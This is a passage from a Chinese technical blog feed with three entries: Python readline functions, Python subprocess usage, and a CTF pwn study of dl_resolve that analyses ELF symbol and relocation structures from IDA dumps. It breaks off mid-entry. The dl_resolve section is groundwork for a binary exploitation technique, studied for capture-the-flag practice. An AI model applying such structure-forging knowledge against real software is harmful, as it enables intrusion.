readline.read_history_file([filename])： # 读取历史命令文件，默认为~&#x2F;.history</span><br><span class="line">        readline.write_history_file([filename]): # 保存历史命令文件，默认为~&#x2F;.history</span><br><span class="line">        readline.get_history_length(): # 获取预设的历史命令条数。负数意味着不限制条数大小。</span><br><span class="line">        readline.set_history_length(length): # 设置要保存到历史命令文件中的命令条数，write_history_file()使用这个数字对历史命令文件进行修改。</span><br><span class="line">        readline.get_current_history_length()： # 返回当前历史文件中历史命令的条数。</span><br><span class="line">        readline.get_history_item(index)： # 获取index索引指定的历史命令。</span><br><span class="line">        readline.remove_history_item(pos)： # 删除指定位置的历史命令。</span><br><span class="line">        readline.replace_history_item(pos, line) ： # 使用给定命令替换指定位置的命令。</span><br><span class="line">        readline.redisplay() ： # 根据命令行缓存实时更新当前屏幕的显示。</span><br><span class="line">        readline.set_startup_hook([function]) ： # 设置或删除钩子函数，如果指定了函数，就将其设为钩子函数，\</span><br><span class="line">　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　 如果没有指定或者设置为None，所有已经安装的钩子函数将被移除，钩子函数在命令行输出提示前执行。</span><br><span class="line">        readline.set_pre_input_hook([function])： # 跟set_startup_hook()方法类似，但是钩子函数是在提示输入完之后，命令行开始读取字符串之前执行。</span><br><span class="line">        readline.set_completer([function])： # 如果提供了函数，则用作自动完成命令函数，如果忽略或者设置为None，则移除之前设置的函数。 \</span><br><span class="line">　　　　　　　　　　　　　　　　　　　　　　　　　　　　命令自动完成函数形式如function(text,state)，text为命令行中输入的字符串，state为选择的的补全命令索引。</span><br><span class="line">        readline.get_completer()： # 返回自动完成命令函数。</span><br><span class="line">        readline.get_completion_type() ： # 返回自动完成的类型。</span><br><span class="line">        readline.get_begidx() ： # 获取命令行tab自动补全范围的第一个值的索引。</span><br><span class="line">        readline.get_endidx() ： # 获取命令行tab自动补全范围的最后一个值的索引。</span><br><span class="line">        readline.set_completer_delims(string) ： # 设置自动补全命令之间的分隔符。</span><br><span class="line">        readline.get_completer_delims() ： # 获取分隔符。</span><br><span class="line">        readline.set_completion_display_matches_hook([function]) ： # 设置或者移除自动完成显示函数。</span><br><span class="line">        readline.add_history(line) ： # 添加最后一条输入的命令到历史文件中。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;Python-raw_input实现tab补全&lt;/h1&gt;
&lt;h2 id=&quot;如果一个raw-input的功能加上了tab补全功能的话，整体的便捷性会提高很多。所以我特地查了很多资料，最后发现一下代码可以使用我们的需求&quot;&gt;如果一个raw_input的功能加上了tab补全功能的
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Python-subprocess模块详解</title>
    <link href="http://yoursite.com/2020/02/14/Python-subprocess%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/02/14/Python-subprocess%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-02-14T12:28:02.000Z</published>
    <updated>2020-03-19T07:53:35.639Z</updated>
    
    <content type="html"><![CDATA[<h1>Python-subprocess模块详解</h1><h2 id="subprocess模块是一个十分强大的模块，他几乎可以执行任何程序并且拿到它的stdin、stdout和stderr，这对我们实现自动化管理有非常大的帮助">subprocess模块是一个十分强大的模块，他几乎可以执行任何程序并且拿到它的stdin、stdout和stderr，这对我们实现自动化管理有非常大的帮助</h2><h3 id="代码格式">代码格式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">popen &#x3D; subprocess.Popen([&#39;python&#39;,&#39;test.py&#39;])</span><br><span class="line">popen &#x3D; subprocess.Popen([&#39;&#x2F;bin&#x2F;sh&#39;],stdin &#x3D; subprocess.PIPE,stdout &#x3D; subprocess.PIPE,stderr &#x3D; subprocess.PIPE)</span><br><span class="line">popen &#x3D; subprocess.Popen(&#39;&#x2F;bin&#x2F;sh&#39;,shell&#x3D;True,stdin &#x3D; subprocess.PIPE,stdout &#x3D; subprocess.PIPE,stderr &#x3D; subprocess.PIPE)</span><br><span class="line">popen &#x3D; subprocess.call([&#39;python&#39;,&#39;test.py&#39;])</span><br></pre></td></tr></table></figure><h3 id="若我们想把错误信息管道接到标准输出流上也是可以实现的">若我们想把错误信息管道接到标准输出流上也是可以实现的</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen &#x3D; subprocess.Popen([&#39;&#x2F;bin&#x2F;sh&#39;],stdin &#x3D; subprocess.PIPE,stdout &#x3D; subprocess.PIPE,stderr &#x3D; subprocess.STDOUT)</span><br></pre></td></tr></table></figure><h3 id="若我们想要写入数据到被启动程序中，可以用以下代码">若我们想要写入数据到被启动程序中，可以用以下代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">popen &#x3D; subprocess.Popen([&#39;&#x2F;bin&#x2F;sh&#39;],stdin &#x3D; subprocess.PIPE,stdout &#x3D; subprocess.PIPE,stderr &#x3D; subprocess.PIPE)</span><br><span class="line">popen.stdin.write(&quot;ls\n&quot;)</span><br><span class="line">print popen.stdout.readline()</span><br></pre></td></tr></table></figure><h3 id="从上面的代码上可以看到subprocess的通用性非常好">从上面的代码上可以看到subprocess的通用性非常好</h3><h3 id="如果我想关闭subprocess启动的进程怎么办呢">如果我想关闭subprocess启动的进程怎么办呢?</h3><h3 id="请参考以下代码">请参考以下代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">popen &#x3D; subprocess.Popen([&#39;&#x2F;bin&#x2F;sh&#39;],stdin &#x3D; subprocess.PIPE,stdout &#x3D; subprocess.PIPE,stderr &#x3D; subprocess.PIPE)</span><br><span class="line">popen.terminate()</span><br></pre></td></tr></table></figure><h3 id="如果我想实现实时运行log输出呢">如果我想实现实时运行log输出呢</h3><h3 id="请参考以下代码-2">请参考以下代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">popen &#x3D; subprocess.Popen([&#39;&#x2F;bin&#x2F;sh&#39;],stdin &#x3D; subprocess.PIPE,stdout &#x3D; subprocess.PIPE,stderr &#x3D; subprocess.PIPE)</span><br><span class="line">while True:</span><br><span class="line">line &#x3D; popen.stdout.readline()</span><br><span class="line">print line</span><br><span class="line">if line &#x3D;&#x3D; &#39;&#39; and popen.poll is None:</span><br><span class="line">break</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;Python-subprocess模块详解&lt;/h1&gt;
&lt;h2 id=&quot;subprocess模块是一个十分强大的模块，他几乎可以执行任何程序并且拿到它的stdin、stdout和stderr，这对我们实现自动化管理有非常大的帮助&quot;&gt;subprocess模块是一个十分强大的模
      
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Pwn-dl_resolve详解</title>
    <link href="http://yoursite.com/2020/02/07/CTF-Pwn-dl_resolve%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/02/07/CTF-Pwn-dl_resolve%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-02-07T06:32:43.000Z</published>
    <updated>2020-03-19T07:59:52.720Z</updated>
    
    <content type="html"><![CDATA[<h1>CTF-Pwn-dl_resolve详解</h1><hr><h2 id="近期对于dl-resolve不大熟练，所以准备整理一份比较完整资料来学习一波，以源码和实践相互结合分析，逐渐深入。">近期对于dl-resolve不大熟练，所以准备整理一份比较完整资料来学习一波，以源码和实践相互结合分析，逐渐深入。</h2><h3 id="首先我编译了一份简单的elf文件，然后通过ida在load段看到了如下的数据">首先我编译了一份简单的elf文件，然后通过ida在load段看到了如下的数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804820C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:0804821C 49 00 00 00 00 00 00 00 00 00 00 00 12 00 00 00                 Elf32_Sym &lt;offset aSetbuf - offset unk_80482CC, 0, 0, 12h, 0, 0&gt; ; &quot;setbuf&quot;</span><br><span class="line">LOAD:0804822C 36 00 00 00 00 00 00 00 00 00 00 00 12 00 00 00                 Elf32_Sym &lt;offset aRead - offset unk_80482CC, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:0804823C 27 00 00 00 00 00 00 00 00 00 00 00 12 00 00 00                 Elf32_Sym &lt;offset aPrintf - offset unk_80482CC, 0, 0, 12h, 0, 0&gt; ; &quot;printf&quot;</span><br><span class="line">LOAD:0804824C 42 00 00 00 00 00 00 00 00 00 00 00 11 00 00 00                 Elf32_Sym &lt;offset aStderr - offset unk_80482CC, 0, 0, 11h, 0, 0&gt; ; &quot;stderr&quot;</span><br><span class="line">LOAD:0804825C 2E 00 00 00 00 00 00 00 00 00 00 00 12 00 00 00                 Elf32_Sym &lt;offset aGetchar - offset unk_80482CC, 0, 0, 12h, 0, 0&gt; ; &quot;getchar&quot;</span><br><span class="line">LOAD:0804826C 20 00 00 00 00 00 00 00 00 00 00 00 12 00 00 00                 Elf32_Sym &lt;offset aGetpid - offset unk_80482CC, 0, 0, 12h, 0, 0&gt; ; &quot;getpid&quot;</span><br><span class="line">LOAD:0804827C 6C 00 00 00 00 00 00 00 00 00 00 00 20 00 00 00                 Elf32_Sym &lt;offset aGmonStart - offset unk_80482CC, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:0804828C 50 00 00 00 00 00 00 00 00 00 00 00 12 00 00 00                 Elf32_Sym &lt;offset aLibcStartMain - offset unk_80482CC, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804828C                                                                            0&gt;</span><br><span class="line">LOAD:0804829C 1A 00 00 00 00 00 00 00 00 00 00 00 11 00 00 00                 Elf32_Sym &lt;offset aStdin - offset unk_80482CC, 0, 0, 11h, 0, 0&gt; ; &quot;stdin&quot;</span><br><span class="line">LOAD:080482AC 3B 00 00 00 00 00 00 00 00 00 00 00 11 00 00 00                 Elf32_Sym &lt;offset aStdout - offset unk_80482CC, 0, 0, 11h, 0, 0&gt; ; &quot;stdout&quot;</span><br><span class="line">LOAD:080482BC 0B 00 00 00 04 A0 04 08 04 00 00 00 11 00 0F 00                 Elf32_Sym &lt;offset aIoStdinUsed - offset unk_80482CC, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:080482BC                                                                            offset _IO_stdin_used, 4, 11h, 0, 0Fh&gt;</span><br><span class="line">LOAD:080482CC                                                 ; ELF String Table</span><br><span class="line">LOAD:080482CC 00                                              unk_80482CC     db    0                 ; DATA XREF: LOAD:0804821C↑o</span><br><span class="line">LOAD:080482CC                                                                                         ; LOAD:0804822C↑o ...</span><br><span class="line">LOAD:080482CD 6C 69 62 63 2E 73 6F 2E 36 00                   aLibcSo6        db &#39;libc.so.6&#39;,0</span><br><span class="line">LOAD:080482D7 5F 49 4F 5F 73 74 64 69 6E 5F 75 73 65 64 00    aIoStdinUsed    db &#39;_IO_stdin_used&#39;,0   ; DATA XREF: LOAD:080482BC↑o</span><br><span class="line">LOAD:080482E6 73 74 64 69 6E 00                               aStdin          db &#39;stdin&#39;,0            ; DATA XREF: LOAD:0804829C↑o</span><br><span class="line">LOAD:080482EC 67 65 74 70 69 64 00                            aGetpid         db &#39;getpid&#39;,0           ; DATA XREF: LOAD:0804826C↑o</span><br><span class="line">LOAD:080482F3 70 72 69 6E 74 66 00                            aPrintf         db &#39;printf&#39;,0           ; DATA XREF: LOAD:0804823C↑o</span><br><span class="line">LOAD:080482FA 67 65 74 63 68 61 72 00                         aGetchar        db &#39;getchar&#39;,0          ; DATA XREF: LOAD:0804825C↑o</span><br><span class="line">LOAD:08048302 72 65 61 64 00                                  aRead           db &#39;read&#39;,0             ; DATA XREF: LOAD:0804822C↑o</span><br><span class="line">LOAD:08048307 73 74 64 6F 75 74 00                            aStdout         db &#39;stdout&#39;,0           ; DATA XREF: LOAD:080482AC↑o</span><br><span class="line">LOAD:0804830E 73 74 64 65 72 72 00                            aStderr         db &#39;stderr&#39;,0           ; DATA XREF: LOAD:0804824C↑o</span><br><span class="line">LOAD:08048315 73 65 74 62 75 66 00                            aSetbuf         db &#39;setbuf&#39;,0           ; DATA XREF: LOAD:0804821C↑o</span><br><span class="line">LOAD:0804831C 5F 5F 6C 69 62 63 5F 73 74 61 72 74 5F 6D 61 69+aLibcStartMain  db &#39;__libc_start_main&#39;,0</span><br><span class="line">LOAD:0804831C 6E 00                                                                                   ; DATA XREF: LOAD:0804828C↑o</span><br><span class="line">LOAD:0804832E 47 4C 49 42 43 5F 32 2E 30 00                   aGlibc20        db &#39;GLIBC_2.0&#39;,0</span><br><span class="line">LOAD:08048338 5F 5F 67 6D 6F 6E 5F 73 74 61 72 74 5F 5F 00    aGmonStart      db &#39;__gmon_start__&#39;,0   ; DATA XREF:</span><br></pre></td></tr></table></figure><h3 id="从上面的数据中我们不难看出Elf32-Sym的结构体如下">从上面的数据中我们不难看出Elf32_Sym的结构体如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;         &#x2F;4字节* Symbol name (string tbl index) *&#x2F;</span><br><span class="line">  Elf32_Addr    st_value;        &#x2F;4字节* Symbol value *&#x2F;</span><br><span class="line">  Elf32_Word    st_size;         &#x2F;4字节* Symbol size *&#x2F;</span><br><span class="line">  unsigned char    st_info;      &#x2F;1字节* Symbol type and binding *&#x2F;</span><br><span class="line">  unsigned char    st_other;     &#x2F;1字节* Symbol visibility *&#x2F;</span><br><span class="line">  Elf32_Section    st_shndx;     &#x2F;2字节* Section index *&#x2F;</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><h3 id="先对于-Elf32-Word-st-name-如何算出来的">先对于  <code>Elf32_Word    st_name</code>  如何算出来的?</h3><h3 id="程序编译的时候设置了一个被调用函数名字符串的基址，就是下面这个地址，下面的数据可以在上面呈现的代码中找到">程序编译的时候设置了一个被调用函数名字符串的基址，就是下面这个地址，下面的数据可以在上面呈现的代码中找到</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080482CC                                                 ; ELF String Table</span><br></pre></td></tr></table></figure><h3 id="所以-st-name-被调用函数名字符串地址-基址">所以 <code>st_name</code> = 被调用函数名字符串地址 - 基址</h3><h3 id="比如上述代码的printf的-st-name-应该等于-0x080482F3-080482CC-0x27-，刚好第一位数字就是0x27">比如上述代码的printf的  <code>st_name </code>  应该等于[0x080482F3 - 080482CC = 0x27]，刚好第一位数字就是0x27</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804823C 27 00 00 00 00 00 00 00 00 00 00 00 12 00 00 00                 Elf32_Sym &lt;offset aPrintf - offset unk_80482CC, 0, 0, 12h, 0, 0&gt; ; &quot;printf&quot;</span><br></pre></td></tr></table></figure><h3 id="1、st-name表示符号名，这里的值是它在相应字符串表中的索引号。如-dynsym-section中所有表项的符号名要从-dynstr-section中获取，而-symtab是从-strtab中获取。而-dynstr和-strtab都是字符串表。">1、st_name表示符号名，这里的值是它在相应字符串表中的索引号。如.dynsym section中所有表项的符号名要从.dynstr section中获取，而.symtab是从.strtab中获取。而.dynstr和.strtab都是字符串表。</h3><h3 id="2、st-value表示符号的值。一般为虚拟地址。">2、st_value表示符号的值。一般为虚拟地址。</h3><h3 id="3、st-size表示符号的大小。比如对于变量，它的值就是变量的数据类型（如int则它的值可能为4个字节）的大小。如果为0则表示该符号无需大小或大小未知。">3、st_size表示符号的大小。比如对于变量，它的值就是变量的数据类型（如int则它的值可能为4个字节）的大小。如果为0则表示该符号无需大小或大小未知。</h3><h3 id="4、st-info表示符号的类型和绑定特征。成员st-info的大小为一个字节，低4位表示符号类型，高4位表示符号的绑定特征。在-usr-include-elf-h文件中，有定义以下三个宏来获取类型或绑定特征的值或将它俩合成st-info的值：">4、st_info表示符号的类型和绑定特征。成员st_info的大小为一个字节，低4位表示符号类型，高4位表示符号的绑定特征。在/usr/include/elf.h文件中，有定义以下三个宏来获取类型或绑定特征的值或将它俩合成st_info的值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define ELF32_ST_BIND(val)      (((unsigned char) (val)) &gt;&gt; 4)</span><br><span class="line">#define ELF32_ST_TYPE(val)      ((val) &amp; 0xf)</span><br><span class="line">#define ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span><br></pre></td></tr></table></figure><h3 id="1-、绑定特征的可能取值如下所示：">(1)、绑定特征的可能取值如下所示：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define STB_LOCAL   0       &#x2F;* Local symbol *&#x2F;</span><br><span class="line">#define STB_GLOBAL  1       &#x2F;* Global symbol *&#x2F;</span><br><span class="line">#define STB_WEAK    2       &#x2F;* Weak symbol *&#x2F;</span><br><span class="line">#define STB_NUM     3       &#x2F;* Number of defined types.  *&#x2F;</span><br><span class="line">#define STB_LOOS    10      &#x2F;* Start of OS-specific *&#x2F;</span><br><span class="line">#define STB_GNU_UNIQUE  10      &#x2F;* Unique symbol.  *&#x2F;</span><br><span class="line">#define STB_HIOS    12      &#x2F;* End of OS-specific *&#x2F;</span><br><span class="line">#define STB_LOPROC  13      &#x2F;* Start of processor-specific *&#x2F;</span><br><span class="line">#define STB_HIPROC  15      &#x2F;* End of processor-specific *&#x2F;</span><br></pre></td></tr></table></figure><h4 id="STB-LOCAL表示局部符号，STB-GLOBAL表示全局符号，STB-WEAK表示弱符号。">STB_LOCAL表示局部符号，STB_GLOBAL表示全局符号，STB_WEAK表示弱符号。</h4><h4 id="弱符号是全局符号，但它们的优先级相对全局符号低。">弱符号是全局符号，但它们的优先级相对全局符号低。</h4><h4 id="局部符号，顾名思义，它只被局限在定义它的目标文件之内，多个目标文件定义的同名局部符号互不影响，全局符号则与之相反。">局部符号，顾名思义，它只被局限在定义它的目标文件之内，多个目标文件定义的同名局部符号互不影响，全局符号则与之相反。</h4><h4 id="相对弱符号，其它的就是强符号。两个同名的强符号会导致重复定义的错误，但如果同名的是一个强符号和多个弱符号，则不报错，链接器会选择其中的强符号。">相对弱符号，其它的就是强符号。两个同名的强符号会导致重复定义的错误，但如果同名的是一个强符号和多个弱符号，则不报错，链接器会选择其中的强符号。</h4><h3 id="2-、符号类型的可能取值如下所示：">(2)、符号类型的可能取值如下所示：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define STT_NOTYPE  0       &#x2F;* Symbol type is unspecified *&#x2F;</span><br><span class="line">#define STT_OBJECT  1       &#x2F;* Symbol is a data object *&#x2F;</span><br><span class="line">#define STT_FUNC    2       &#x2F;* Symbol is a code object *&#x2F;</span><br><span class="line">#define STT_SECTION 3       &#x2F;* Symbol associated with a section *&#x2F;</span><br><span class="line">#define STT_FILE    4       &#x2F;* Symbol&#39;s name is file name *&#x2F;</span><br><span class="line">#define STT_COMMON  5       &#x2F;* Symbol is a common data object *&#x2F;</span><br><span class="line">#define STT_TLS     6       &#x2F;* Symbol is thread-local data object*&#x2F;</span><br><span class="line">#define STT_NUM     7       &#x2F;* Number of defined types.  *&#x2F;</span><br><span class="line">#define STT_LOOS    10      &#x2F;* Start of OS-specific *&#x2F;</span><br><span class="line">#define STT_GNU_IFUNC   10      &#x2F;* Symbol is indirect code object *&#x2F;</span><br><span class="line">#define STT_HIOS    12      &#x2F;* End of OS-specific *&#x2F;</span><br><span class="line">#define STT_LOPROC  13      &#x2F;* Start of processor-specific *&#x2F;</span><br><span class="line">#define STT_HIPROC  15      &#x2F;* End of processor-specific *&#x2F;</span><br></pre></td></tr></table></figure><h4 id="STT-NOTYPE表示未指定类型。每个符号表开头都有一个该类型的表项。">STT_NOTYPE表示未指定类型。每个符号表开头都有一个该类型的表项。</h4><h4 id="STT-OBJECT表示数据，如变量、数组等。">STT_OBJECT表示数据，如变量、数组等。</h4><h4 id="STT-FUNC表示函数或可执行代码。">STT_FUNC表示函数或可执行代码。</h4><h4 id="STT-SECTION表示一个section，该类型符号的绑定特征是STB-LOCAL。">STT_SECTION表示一个section，该类型符号的绑定特征是STB_LOCAL。</h4><h4 id="STT-FILE表示文件名。该类型符号的绑定特征是STB-LOCAL，st-shndx的值为SHN-ABS。">STT_FILE表示文件名。该类型符号的绑定特征是STB_LOCAL，st_shndx的值为SHN_ABS。</h4><h3 id="5、st-other表示符号的可见性，只使用了该成员的低2位。它的可能取值如下所示：">5、st_other表示符号的可见性，只使用了该成员的低2位。它的可能取值如下所示：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define STV_DEFAULT 0       &#x2F;* Default symbol visibility rules *&#x2F;</span><br><span class="line">#define STV_INTERNAL    1       &#x2F;* Processor specific hidden class *&#x2F;</span><br><span class="line">#define STV_HIDDEN  2       &#x2F;* Sym unavailable in other modules *&#x2F;</span><br><span class="line">#define STV_PROTECTED   3       &#x2F;* Not preemptible, not exported *&#x2F;</span><br></pre></td></tr></table></figure><h3 id="6、st-shndx表示符号所在的section对应的section-header的索引号。它有以下三个特殊值：">6、st_shndx表示符号所在的section对应的section header的索引号。它有以下三个特殊值：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define SHN_UNDEF   0       &#x2F;* Undefined section *&#x2F;</span><br><span class="line">#define SHN_ABS     0xfff1      &#x2F;* Associated symbol is absolute *&#x2F;</span><br><span class="line">#define SHN_COMMON  0xfff2      &#x2F;* Associated symbol is common *&#x2F;</span><br></pre></td></tr></table></figure><h4 id="SHN-UNDEF表示该符号是未定义的，也就是说它可能定义在其他目标文件中，只有在程序执行时才能实际确定。对于索引值为STN-UNDEF的表项，st-shndx的值也是SHN-UNDEF。">SHN_UNDEF表示该符号是未定义的，也就是说它可能定义在其他目标文件中，只有在程序执行时才能实际确定。对于索引值为STN_UNDEF的表项，st_shndx的值也是SHN_UNDEF。</h4><h4 id="SHN-ABS表示该符号的值在重定位时不会改变。">SHN_ABS表示该符号的值在重定位时不会改变。</h4><h4 id="SHN-COMMON表示该符号尚未被分配空间，它的值st-value为地址对齐字节数。">SHN_COMMON表示该符号尚未被分配空间，它的值st_value为地址对齐字节数。</h4><h3 id="对于pwn来说，总之我们这里只要考虑st-name-st-info">对于pwn来说，总之我们这里只要考虑st_name, st_info</h3><h3 id="我们抽取最一般的规律，如下">我们抽取最一般的规律，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">st_name &#x3D; 被调用函数名字符串地址的偏移</span><br><span class="line">st_info &#x3D; (0x1 &lt;&lt; 4) + 0x2 &#x2F;&#x2F; (STB_GLOBAL &lt;&lt; 4) + STT_FUNC</span><br><span class="line">&#x2F;&#x2F; 如果要绑定函数 st_info &#x3D; 0x12 例如:__libc_start_main</span><br><span class="line">&#x2F;&#x2F; 如果要绑定一般的指针 st_info &#x3D; 0x11 例如:stdin</span><br><span class="line">&#x2F;&#x2F; 如果要绑定变量 st_info &#x3D; 0x20 例如:__gmon_start__</span><br></pre></td></tr></table></figure><h3 id="对于其他的数据统统为0，如下">对于其他的数据统统为0，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">被调用函数名字符串地址的偏移(4字节) 00 00 00 00 00 00 00 00 st_info(1字节) 00 00 00</span><br></pre></td></tr></table></figure><h3 id="这样我们学好了-dynstr和-dynsym结构体的知识">这样我们学好了.dynstr和.dynsym结构体的知识</h3><h3 id="接着我们学习-rel-plt，接着通过ida找到下面的数据，如下">接着我们学习.rel.plt，接着通过ida找到下面的数据，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048380                                                 ; ELF REL Relocation Table</span><br><span class="line">LOAD:08048380 F0 BF 04 08 06 04 00 00                                         Elf32_Rel &lt;804BFF0h, 406h&gt; ; R_386_GLOB_DAT stderr</span><br><span class="line">LOAD:08048388 F4 BF 04 08 06 07 00 00                                         Elf32_Rel &lt;804BFF4h, 706h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048390 F8 BF 04 08 06 09 00 00                                         Elf32_Rel &lt;804BFF8h, 906h&gt; ; R_386_GLOB_DAT stdin</span><br><span class="line">LOAD:08048398 FC BF 04 08 06 0A 00 00                                         Elf32_Rel &lt;804BFFCh, 0A06h&gt; ; R_386_GLOB_DAT stdout</span><br><span class="line">LOAD:080483A0                                                 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:080483A0 0C C0 04 08 07 01 00 00                                         Elf32_Rel &lt;804C00Ch, 107h&gt; ; R_386_JMP_SLOT setbuf</span><br><span class="line">LOAD:080483A8 10 C0 04 08 07 02 00 00                                         Elf32_Rel &lt;804C010h, 207h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080483B0 14 C0 04 08 07 03 00 00                                         Elf32_Rel &lt;804C014h, 307h&gt; ; R_386_JMP_SLOT printf</span><br><span class="line">LOAD:080483B8 18 C0 04 08 07 05 00 00                                         Elf32_Rel &lt;804C018h, 507h&gt; ; R_386_JMP_SLOT getchar</span><br><span class="line">LOAD:080483C0 1C C0 04 08 07 06 00 00                                         Elf32_Rel &lt;804C01Ch, 607h&gt; ; R_386_JMP_SLOT getpid</span><br><span class="line">LOAD:080483C8 20 C0 04 08 07 08 00 00                                         Elf32_Rel &lt;804C020h, 807h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br></pre></td></tr></table></figure><h3 id="以上数据就是-rel-plt，从中我们可以提取出一个结构体，如下">以上数据就是.rel.plt，从中我们可以提取出一个结构体，如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset;        &#x2F;4字节* Address * (这个就是got的地址[当然你可以自定义一个地址])&#x2F;</span><br><span class="line">  Elf32_Word    r_info;          &#x2F;4字节* Relocation type and symbol index *&#x2F;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><h3 id="简单说r-offset就是got地址">简单说r_offset就是got地址</h3><h3 id="接下来稍微简单说一下r-info">接下来稍微简单说一下r_info</h3><h4 id="r-info最低位为6则是变量，为7则是函数">r_info最低位为6则是变量，为7则是函数</h4><h4 